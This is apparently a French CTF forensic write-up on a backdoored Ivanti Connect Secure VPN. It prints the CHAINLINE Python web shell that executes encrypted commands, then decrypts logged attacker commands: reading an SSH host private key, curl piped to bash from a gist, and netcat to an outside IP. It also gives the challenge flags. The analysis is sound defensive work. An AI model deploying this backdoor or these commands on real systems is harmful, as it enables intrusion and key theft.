# Horreur, malheur 3/5 - Simple persistane

## Challenge
Introduction commune à la série Horreur, malheur

Vous venez d'être embauché en tant que Responsable de la Sécurité des Systèmes d'Information (RSSI) d'une entreprise stratégique.

En arrivant à votre bureau le premier jour, vous vous rendez compte que votre prédécesseur vous a laissé une clé USB avec une note dessus : VPN compromis (intégrité). Version 22.3R1 b1647.

Note : La première partie (Archive chiffrée) débloque les autres parties, à l'exception de la seconde partie (Accès initial) qui peut être traitée indépendamment. Nous vous recommandons de traiter les parties dans l'ordre.

Vous avez réussi à déchiffrer l'archive. Il semblerait qu'il y ait dans cette archive une autre archive, qui contient le résultat du script de vérification d'intégrité de l'équipement.

À l'aide de cette dernière archive et des journaux, vous cherchez maintenant les traces d'une persistance déposée et utilisée par l'attaquant.

## Analyse new archive from part2
In part2, we recovered a new archive extracted from the original `encrypted archive`. Here's what is contains:
- a python package `cav`
- a python script `configencrypt`

```console
$ tree home
home
├── bin
│   └── configencrypt
└── venv3
    └── lib
        └── python3.6
            └── site-packages
                └── cav-0.1-py3.6.egg

5 directories, 2 files
```

The python script `configencrypt` shows what was used to encrypt the original archive: zipping an input file together with files `/home/VERSION` and `/data/flag.txt` using a password read from `/data/flag.txt` (where only the hash is retained). That's precisely what we did at step2, so the step2 flag comes from file `/data/flag.txt`:
```python
if len(sys.argv) == 3 and os.path.basename(sys.argv[2]).startswith("pulsesecure-state-"):
    with open("/data/flag.txt", "r") as handle:
        flag = handle.read().replace("\n","")
    flag = "FCSC{" + flag + "}"
    infile = sys.argv[1]
    outfile = sys.argv[2]
    command = "zip -P "+flag+" "+outfile+" "+infile+" "+"/home/VERSION" + " /data/flag.txt"
    os.system(command)
else:
    subprocess.Popen(["/home/bin/configencrypt.bak"] + sys.argv[1:])
```

Now let's look at the python package `cav`.

## Python package cav
Googling `cav-0.1-py3.6.egg` sends me right to this paper from `Mandiant`, still about the `Ivanti Connect Secure` VPN issue: https://www.mandiant.com/resources/blog/investigating-ivanti-zero-day-exploitation

Here's what is said about  `cav-0.1-py3.6.egg`:
```
CHAINLINE Web Shell

After the initial exploitation of an appliance, Mandiant identified UNC5221 leveraging a custom web shell that Mandiant is tracking as CHAINLINE. CHAINLINE is a Python web shell backdoor that is embedded in a Ivanti Connect Secure Python package that enables arbitrary command execution.

CHAINLINE was identified in the CAV Python package in the following path: /home/venv3/lib/python3.6/site-packages/cav-0.1-py3.6.egg/cav/api/resources/health.py. This is the same Python package modified to support the WIREFIRE web shell.

Unlike WIREFIRE, which modifies an existing file, CHAINLINE creates a new file called health.py, which is not a legitimate filename in the CAV Python package. The existence of this filename or an associated compiled Python cache file may indicate the presence of CHAINLINE.
```

Looking into the `cav-0.1-py3.6.egg` file that we extracted, we indeed find this illegitimate file ( / Backdoor) `health.py`:
```
  -rw-rw-r--      1075   5-Dec-2022  09:34:00  cav/api/resources/health.py
```

## Backdoor health.py in python package cav
Here's the code of that backdoor from `home/venv3/lib/python3.6/site-packages/cav/api/resources/health.py`:
```python
class Health(Resource):
    """
    Handles requests that are coming for client to post the application data.
    """

    def get(self):
        try:
            with open("/data/flag.txt", "r") as handle:
                dskey = handle.read().replace("\n", "")
            data = request.args.get("cmd")
            if data:
                aes = AES.new(dskey.encode(), AES.MODE_ECB)
                cmd = zlib.decompress(aes.decrypt(base64.b64decode(data)))
                result = subprocess.getoutput(cmd)
                if not isinstance(result, bytes): result = str(result).encode()
                result = base64.b64encode(aes.encrypt(pad(zlib.compress(result), 32))).decode\
()
                return result, 200
        except Exception as e:
            return str(e), 501
```

So this is taking a command send on the api entrypoint via a `GET request`:
- command is `b64 decoded`, `aes decrypted`, `zlib decompressed`
- once decoded, command is executed
- once executed, command output is `zlib compressed`, `aes encrypted`, `b64 encoded` and returned as data in the `GET response`
- encryption is based on `AEC ECB mode` and the contents of `/data/flag.txt` is used as the key.

Oh, but we already know the contents of `/data/flag.txt`: that's step2 flag (where only the hash is retained). So we know the `AES key` used here.

## Logs: capture of communication via the backdoor
Looking at the logs, we also find some communication via this illegitimate endpoint:
```console
$ grep -rain 'health?'
cav_webserv.log:24151:[pid: 22151|app: 0|req: 15645/24114] 172.18.0.4 () {32 vars in 557 bytes} [Fri Mar 15 06:36:24 2024] GET /api/v1/cav/client/health?cmd=DjrB3j2wy3YJHqXccjkWidUBniQPmhTkHeiA59kIzfA%3D => generated 47 bytes in 83 msecs (HTTP/1.1 200) 2 headers in 71 bytes (3 switches on core 998)
cav_webserv.log:24572:[pid: 22151|app: 0|req: 15957/24535] 172.18.0.4 () {32 vars in 557 bytes} [Fri Mar 15 06:36:27 2024] GET /api/v1/cav/client/health?cmd=K/a6JKeclFNFwnqrFW/6ENBiq0BnskUVoqBf4zn3vyQ%3D => generated 175 bytes in 74 msecs (HTTP/1.1 200) 2 headers in 72 bytes (3 switches on core 998)
cav_webserv.log:25608:[pid: 22151|app: 0|req: 16618/25571] 172.18.0.4 () {32 vars in 649 bytes} [Fri Mar 15 06:36:36 2024] GET /api/v1/cav/client/health?cmd=/ppF2z0iUCf0EHGFPBpFW6pWT4v/neJ6wP6dERUuBM/6CAV2hl/l4o7KqS7TvTZAWDVxqTd6EansrCTOAnAwdQ%3D%3D => generated 91 bytes in 74 msecs (HTTP/1.1 200) 2 headers in 71 bytes (3 switches on core 997)
cav_webserv.log:26696:[pid: 22150|app: 0|req: 9307/26659] 172.18.0.4 () {32 vars in 649 bytes} [Fri Mar 15 06:36:44 2024] GET /api/v1/cav/client/health?cmd=Lmrbj2rb7SmCkLLIeBfUxTA2pkFQex/RjqoV2WSBr0EyxihrKLvkqPKO3I7KV1bhm8Y61VzkIj3tyLKLgfCdlA%3D%3D => generated 1755 bytes in 80 msecs (HTTP/1.1 200) 2 headers in 73 bytes (3 switches on core 999)
cav_webserv.log:27994:[pid: 22150|app: 0|req: 9690/27957] 172.18.0.4 () {32 vars in 821 bytes} [Fri Mar 15 06:36:54 2024] GET /api/v1/cav/client/health?cmd=yPfHKFiBi6MxfKlndP99J4eco1zxfKUhriwlanMWKE3NhhHtYkSOrj4QZhvf6u17fJ%2B74TvmsMdtYH6pnvcNZOq3JRu2hdv2Za51x82UYXG1WpYtAgCa42dOx/deHzAlZNwM7VvCZckPLfDeBGZyLHX/XP4spz4lpfau9mZZ%2B/o%3D => generated 47 bytes in 479 msecs (HTTP/1.1 200) 2 headers in 71 bytes (3 switches on core 998)
cav_webserv.log:30328:[pid: 22151|app: 0|req: 19876/30291] 172.18.0.4 () {32 vars in 725 bytes} [Fri Mar 15 06:37:13 2024] GET /api/v1/cav/client/health?cmd=E1Wi18Bo5mPNTp/CaB5o018KdRfH2yOnexhwSEuxKWBx7%2Byv4YdHT3ASGAL67ozaoZeUzaId88ImfFvaPeSr6XtPvRqgrLJPl7oH2GHafzEPPplWHDPQQUfxsYQjkbhT => generated 47 bytes in 76 msecs (HTTP/1.1 200) 2 headers in 71 bytes (3 switches on core 997)
cav_webserv.log:32205:[pid: 22151|app: 0|req: 21170/32168] 172.18.0.4 () {32 vars in 825 bytes} [Fri Mar 15 06:37:28 2024] GET /api/v1/cav/client/health?cmd=7JPshdVsmVSiQWcRNKLjY1FkPBh91d2K3SUK7HrBcEJu/XbfMG9gY/pTNtVhfVS7RXpWHjLOtW01JKfmiX/hOJQ8QbfXl2htqcppn%2BXeiWHpCWr%2ByyabDservMnHxrocU4uIzWNXHef5VNVClGgV4JCjjI1lofHyrGtBD%2B0nZc8%3D => generated 47 bytes in 353 msecs (HTTP/1.1 200) 2 headers in 71 bytes (3 switches on core 997)
cav_webserv.log:40311:[pid: 22150|app: 0|req: 13730/40274] 172.18.0.4 () {32 vars in 653 bytes} [Fri Mar 15 06:37:41 2024] GET /api/v1/cav/client/health?cmd=WzAd4Ok8kSOF8e1eS6f8rdGE4sH5Ql8injexw36evBw/mHk617VRAtzEhjXwOZyR/tlQ20sgz%2BJxmwQdxnJwNg%3D%3D => generated 47 bytes in 53732 msecs (HTTP/1.1 200) 2 headers in 71 bytes (3 switches on core 997)
cav_webserv.log:42388:[pid: 22151|app: 0|req: 28123/42351] 172.18.0.4 () {32 vars in 557 bytes} [Fri Mar 15 06:38:51 2024] GET /api/v1/cav/client/health?cmd=G9QtDIGXyoCA6tZC6DtLz89k5FDdQNe2TfjZ18hdPbM%3D => generated 47 bytes in 73 msecs (HTTP/1.1 200) 2 headers in 71 bytes (3 switches on core 999)
cav_webserv.log:43695:[pid: 22151|app: 0|req: 29153/43658] 172.18.0.4 () {32 vars in 565 bytes} [Fri Mar 15 06:39:01 2024] GET /api/v1/cav/client/health?cmd=QV2ImqgrjrL7%2BtofpO12S9bqgDCRHYXGJwaOIihb%2BNI%3D => generated 91 bytes in 72 msecs (HTTP/1.1 200) 2 headers in 71 bytes (3 switches on core 999)
```

We can extract it like so:
```console
$ grep -rain "health?" | awk -F '=' '{print($2)}'

DjrB3j2wy3YJHqXccjkWidUBniQPmhTkHeiA59kIzfA%3D
K/a6JKeclFNFwnqrFW/6ENBiq0BnskUVoqBf4zn3vyQ%3D
/ppF2z0iUCf0EHGFPBpFW6pWT4v/neJ6wP6dERUuBM/6CAV2hl/l4o7KqS7TvTZAWDVxqTd6EansrCTOAnAwdQ%3D%3D
Lmrbj2rb7SmCkLLIeBfUxTA2pkFQex/RjqoV2WSBr0EyxihrKLvkqPKO3I7KV1bhm8Y61VzkIj3tyLKLgfCdlA%3D%3D
yPfHKFiBi6MxfKlndP99J4eco1zxfKUhriwlanMWKE3NhhHtYkSOrj4QZhvf6u17fJ%2B74TvmsMdtYH6pnvcNZOq3JRu2hdv2Za51x82UYXG1WpYtAgCa42dOx/deHzAlZNwM7VvCZckPLfDeBGZyLHX/XP4spz4lpfau9mZZ%2B/o%3D
E1Wi18Bo5mPNTp/CaB5o018KdRfH2yOnexhwSEuxKWBx7%2Byv4YdHT3ASGAL67ozaoZeUzaId88ImfFvaPeSr6XtPvRqgrLJPl7oH2GHafzEPPplWHDPQQUfxsYQjkbhT
7JPshdVsmVSiQWcRNKLjY1FkPBh91d2K3SUK7HrBcEJu/XbfMG9gY/pTNtVhfVS7RXpWHjLOtW01JKfmiX/hOJQ8QbfXl2htqcppn%2BXeiWHpCWr%2ByyabDservMnHxrocU4uIzWNXHef5VNVClGgV4JCjjI1lofHyrGtBD%2B0nZc8%3D
WzAd4Ok8kSOF8e1eS6f8rdGE4sH5Ql8injexw36evBw/mHk617VRAtzEhjXwOZyR/tlQ20sgz%2BJxmwQdxnJwNg%3D%3D
G9QtDIGXyoCA6tZC6DtLz89k5FDdQNe2TfjZ18hdPbM%3D
QV2ImqgrjrL7%2BtofpO12S9bqgDCRHYXGJwaOIihb%2BNI%3D
```

We also need to `URL decode` the data by replacing `%3D` by `=` and `%2B` by `+`. We end up with `base64` encoded data:
```
DjrB3j2wy3YJHqXccjkWidUBniQPmhTkHeiA59kIzfA=
K/a6JKeclFNFwnqrFW/6ENBiq0BnskUVoqBf4zn3vyQ=
/ppF2z0iUCf0EHGFPBpFW6pWT4v/neJ6wP6dERUuBM/6CAV2hl/l4o7KqS7TvTZAWDVxqTd6EansrCTOAnAwdQ==
Lmrbj2rb7SmCkLLIeBfUxTA2pkFQex/RjqoV2WSBr0EyxihrKLvkqPKO3I7KV1bhm8Y61VzkIj3tyLKLgfCdlA==
yPfHKFiBi6MxfKlndP99J4eco1zxfKUhriwlanMWKE3NhhHtYkSOrj4QZhvf6u17fJ+74TvmsMdtYH6pnvcNZOq3JRu2hdv2Za51x82UYXG1WpYtAgCa42dOx/deHzAlZNwM7VvCZckPLfDeBGZyLHX/XP4spz4lpfau9mZZ+/o=
E1Wi18Bo5mPNTp/CaB5o018KdRfH2yOnexhwSEuxKWBx7+yv4YdHT3ASGAL67ozaoZeUzaId88ImfFvaPeSr6XtPvRqgrLJPl7oH2GHafzEPPplWHDPQQUfxsYQjkbhT
7JPshdVsmVSiQWcRNKLjY1FkPBh91d2K3SUK7HrBcEJu/XbfMG9gY/pTNtVhfVS7RXpWHjLOtW01JKfmiX/hOJQ8QbfXl2htqcppn+XeiWHpCWr+yyabDservMnHxrocU4uIzWNXHef5VNVClGgV4JCjjI1lofHyrGtBD+0nZc8=
WzAd4Ok8kSOF8e1eS6f8rdGE4sH5Ql8injexw36evBw/mHk617VRAtzEhjXwOZyR/tlQ20sgz+JxmwQdxnJwNg==
G9QtDIGXyoCA6tZC6DtLz89k5FDdQNe2TfjZ18hdPbM=
QV2ImqgrjrL7+tofpO12S9bqgDCRHYXGJwaOIihb+NI=
```

## Decode the communication via the backdoor
We already know how the traffic is encrypted and we also know the `AES key` used. Let's do it:
```python
payloads = ['DjrB3j2wy3YJHqXccjkWidUBniQPmhTkHeiA59kIzfA=',
            'K/a6JKeclFNFwnqrFW/6ENBiq0BnskUVoqBf4zn3vyQ=',
            '/ppF2z0iUCf0EHGFPBpFW6pWT4v/neJ6wP6dERUuBM/6CAV2hl/l4o7KqS7TvTZAWDVxqTd6EansrCTOAnAwdQ==',
            'Lmrbj2rb7SmCkLLIeBfUxTA2pkFQex/RjqoV2WSBr0EyxihrKLvkqPKO3I7KV1bhm8Y61VzkIj3tyLKLgfCdlA==',
            'yPfHKFiBi6MxfKlndP99J4eco1zxfKUhriwlanMWKE3NhhHtYkSOrj4QZhvf6u17fJ+74TvmsMdtYH6pnvcNZOq3JRu2hdv2Za51x82UYXG1WpYtAgCa42dOx/deHzAlZNwM7VvCZckPLfDeBGZyLHX/XP4spz4lpfau9mZZ+/o=',
            'E1Wi18Bo5mPNTp/CaB5o018KdRfH2yOnexhwSEuxKWBx7+yv4YdHT3ASGAL67ozaoZeUzaId88ImfFvaPeSr6XtPvRqgrLJPl7oH2GHafzEPPplWHDPQQUfxsYQjkbhT',
            '7JPshdVsmVSiQWcRNKLjY1FkPBh91d2K3SUK7HrBcEJu/XbfMG9gY/pTNtVhfVS7RXpWHjLOtW01JKfmiX/hOJQ8QbfXl2htqcppn+XeiWHpCWr+yyabDservMnHxrocU4uIzWNXHef5VNVClGgV4JCjjI1lofHyrGtBD+0nZc8=',
            'WzAd4Ok8kSOF8e1eS6f8rdGE4sH5Ql8injexw36evBw/mHk617VRAtzEhjXwOZyR/tlQ20sgz+JxmwQdxnJwNg==',
            'G9QtDIGXyoCA6tZC6DtLz89k5FDdQNe2TfjZ18hdPbM=',
            'QV2ImqgrjrL7+tofpO12S9bqgDCRHYXGJwaOIihb+NI='
            ]

# /data/flag.txt: 'FCSC{50c53be3eece1dd551bebffe0dd5535c}'
flag  = '50c53be3eece1dd551bebffe0dd5535c'
dskey = flag
aes   = AES.new(dskey.encode(), AES.MODE_ECB)

for data in payloads:
    cmd = zlib.decompress(aes.decrypt(base64.b64decode(data)))
    print(cmd.decode())
```

Here we go:
```console
$ python3 sol.py
id
ls /
echo FCSC{6cd63919125687a10d32c4c8dd87a5d0c8815409}
cat /data/runtime/etc/ssh/ssh_host_rsa_key
/home/bin/curl -k -s https://api.github.com/repos/joke-finished/2e18773e7735910db0e1ad9fc2a100a4/commits?per_page=50 -o /tmp/a
cat /tmp/a | grep "name" | /pkg/uniq | cut -d ":" -f 2 | cut -d '"' -f 2 | tr -d '
' | grep -o . | tac | tr -d '
'  > /tmp/b
a=`cat /tmp/b`;b=${a:4:32};c="https://api.github.com/gists/${b}";/home/bin/curl -k -s ${c} | grep 'raw_url' | cut -d '"' -f 4 > /tmp/c
c=`cat /tmp/c`;/home/bin/curl -k ${c} -s | bash
rm /tmp/a /tmp/b /tmp/c
nc 146.0.228.66:1337
```

## Python
Python code to decrypt the communication through the backdoor: [sol.py](./sol.py)

## Flag
> FCSC{6cd63919125687a10d32c4c8dd87a5d0c8815409}
